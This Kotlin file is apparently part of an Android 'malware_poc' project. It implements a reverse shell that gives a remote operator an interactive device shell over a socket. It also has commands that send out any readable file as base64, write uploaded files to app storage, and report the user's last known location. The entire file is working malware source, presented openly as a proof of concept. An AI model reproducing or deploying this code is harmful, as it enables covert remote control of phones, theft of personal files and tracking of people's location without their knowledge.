package com.antoinejonard.malware_poc.malicious

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.util.AndroidRuntimeException
import android.util.Base64
import android.util.Log
import androidx.core.app.ActivityCompat
import com.antoinejonard.malware_poc.MainActivity
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.io.*
import java.net.Socket
import java.util.*
import kotlin.math.log

class Shell() {

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private var lastLocation : Location? = null

    @Throws(Exception::class)
    suspend fun executeShell(socket: Socket) {

        val context = MainActivity.appContext

        // For location
        fusedLocationClient = context?.let { LocationServices.getFusedLocationProviderClient(it) }!!
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            fusedLocationClient.lastLocation.addOnSuccessListener {
                lastLocation = it
            }
        }else {
            Log.e(TAG,"no location permission granted")
        }

        val cmd = "system/bin/sh"
        val p = ProcessBuilder(cmd).redirectErrorStream(true).start()
        val pi = p.inputStream
        val pe = p.errorStream
        val si = socket.getInputStream()
        val po = p.outputStream
        val so = socket.getOutputStream()

        so.write("----------Starting Shell----------\n".toByteArray(charset("UTF-8")))
        so.write(("[I] "+ Calendar.getInstance(TimeZone.getDefault()).time+"\n").toByteArray(charset("UTF-8")))
        so.write("$> ".toByteArray(charset("UTF-8")))

        val buff1 = BufferedReader(InputStreamReader(si))
        val buff2 = BufferedReader(InputStreamReader(pi))
        var line: String
        while (!socket.isClosed) {
            try {
                while (pi.available() > 0) {
                    var b = ""
                    while (buff2.ready()) {
                        line = buff2.readLine()
                        b += """
                            $line
                            """.trimIndent()
                    }
                    Log.d(TAG, b)
                    so.write(b.toByteArray(charset("UTF-8")))
                    so.write("\n$> ".toByteArray(charset("UTF-8")))
                }
                while (pe.available() > 0) {
                    so.write(pe.read())
                }
                while (si.available() > 0) {
                    var a = buff1.readLine()
                    a += "\n"
                    Log.d(TAG, a)
                    if (a.equals("exit")){
                        p.destroy();
                        socket.close()
                        break;
                    }else if (a.startsWith("put ")) {
                        val data = a.split(" ").toTypedArray()
                        val filename = data[1]
                        val fileext = data[2]
                        val encodedString = data[3]
                        val fullFile = "$filename.$fileext"
                        setBase64Data(fullFile, encodedString)
                        so.write("$fullFile should be under ${MainActivity.appContext?.filesDir}\n$> ".toByteArray(charset("UTF-8")))
                    } else if (a.startsWith("get ")) {
                        val filepath = a.split(" ").toTypedArray()[1].trim { it <= ' ' }
                        Log.d(TAG, filepath)
                        val file = File(filepath)
                        if (file.exists()) {
                            var sendingFiledata = ""
                            val fullFilename = filepath.substring(filepath.lastIndexOf("/") + 1)
                            val fileData = fullFilename.split("\\.").toTypedArray()
                            Log.d(TAG, "exists")
                            val base64Data = getBase64Data(file)
                            if (base64Data == null) {
                                so.write("[E] Cant transfer Large File\n$> ".toByteArray(charset("UTF-8")))
                            }
                            so.write("getFile\n$> ".toByteArray(charset("UTF-8")))
                            sendingFiledata += """
                                ${fileData[0]}|_|${fileData[1]}|_|$base64Data
                                END123
                                
                                """.trimIndent()
                            so.write(sendingFiledata.toByteArray(charset("UTF-8")))
                        } else {
                            Log.d(TAG, "notexists")
                            so.write("[E] File Doesnt Exists\n$> ".toByteArray(charset("UTF-8")))
                        }
                    } else if (a.startsWith("location")){
                        so.write(((if (lastLocation == null) "[E] Can't get user location" else "[I]"+lastLocation.toString())+"\n$> ").toByteArray(charset("UTF-8")))
                    } else {
                        po.write(a.toByteArray(charset("UTF-8")))
                    }
                }
                so.flush()
                po.flush()
                delay(50)
                try {
                    p.exitValue()
                    break
                } catch (_: Exception) {
                }
            } catch (e: Exception) {
                Log.d("service_runner", "called")
            }
        }
        so.write("Exiting...\n".toByteArray(charset("UTF-8")))
        p.destroy()
    }

    private fun getBase64Data(file: File): String? {
        var getBytes = byteArrayOf()
        try {
            getBytes = ByteArray(file.length().toInt())
            Log.d(TAG, file.length().toString())
            if (file.length() > 16000000) {
                return null
            }
            val inputStream: InputStream = FileInputStream(file)
            inputStream.read(getBytes)
            inputStream.close()
        } catch (e: IOException) {
            e.printStackTrace()
        }
        var value: String? = ""
        value = try {
            Base64.encodeToString(getBytes, Base64.DEFAULT)
        } catch (e: AndroidRuntimeException) {
            e.printStackTrace()
            return null
        }
        return value
    }

    private suspend fun setBase64Data(filename: String, base64Data: String) {
        val file = File(MainActivity.appContext?.filesDir, filename)
        if (file.exists()) {
            file.delete()
        }
        withContext(Dispatchers.IO){
            try {
                file.createNewFile()
                val fos = FileOutputStream(file)
                fos.write(Base64.decode(base64Data, Base64.NO_WRAP))
                fos.close()
            } catch (e: FileNotFoundException) {
                e.printStackTrace()
            } catch (e: IOException) {
                e.printStackTrace()
            }
        }
    }

    companion object {
        var TAG = "REVERSE_SHELL"
    }
}